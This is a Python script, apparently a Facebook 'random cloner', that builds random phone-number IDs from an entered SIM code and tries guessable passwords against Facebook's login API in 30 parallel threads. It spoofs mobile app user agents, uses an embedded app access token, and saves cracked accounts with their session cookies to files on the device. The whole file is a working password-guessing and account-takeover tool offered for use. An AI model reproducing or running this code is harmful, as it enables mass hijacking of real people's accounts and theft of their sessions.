import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor as tred

class Mr_Code:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
    
    def banner(self):
        os.system("clear")
        print("DEVELOPER  : HADI ANHAF AIMAN")
        print("FEATURE    : RANDOM CLONER")
        print("VERSION    : 1.2")
        print("----------------------------------")
    
    def Main(self):
        self.banner()
        code = input("ENTER SIM CODE : ")
        limit = int(input("ENTER ID LIMIT : "))
        for a in range(limit):
            xxx = "".join(random.choice(string.digits) for _ in range(8))
            self.gen.append(xxx)
        with tred(max_workers=30) as randx:
            print("IF NO RESULT USE FLIGHT MODE")
            print("----------------------------------")
            for love in self.gen:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],"i love you","ff lover"]
                randx.submit(self.method,ids,passlist)
        print("\n")
        print("----------------------------------")
    
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mAIMAN-XD {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                head = {
                'User-Agent':self.randua(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = "https://graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    uid = str(response['uid'])
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    print(f"\r\r\x1b[38;5;46mAIMAN-OK • {uid} • {pas}")
                    open("/sdcard/AIMAN-RNDM-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                    self.oks.append(uid)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/AIMAN-RNDM-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
    
    def randua(self):
        ua1 = "[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/392505018;FBDM/{density=2.75,width=1080,height=2177};FBLC/en_US;FBRV/0;FBCR/Airtel;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
        ua2 = "[FBAN/FB4A;FBAV/380.0.0.29.109;FBBV/390885025;FBDM/{density=2.75,width=1080,height=2062};FBLC/en_US;FBRV/392634595;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 6 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        ua3 = "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918983;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/342775358;FBCR/Airtel;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-J327VPP;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua4 = "[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919090;FBDM/{density=2.0,width=720,height=1448};FBLC/en_US;FBRV/385738515;FBCR/WIFI;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3195;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
        ua5 = "[FBAN/FB4A;FBAV/369.0.0.18.103;FBBV/373751961;FBDM/{density=3.0,width=1080,height=2032};FBLC/en_US;FBRV/374681835;FBCR/Telenor SE;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/LLD-L31;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)

if __name__ == "__main__":
    Mr_Code().Main()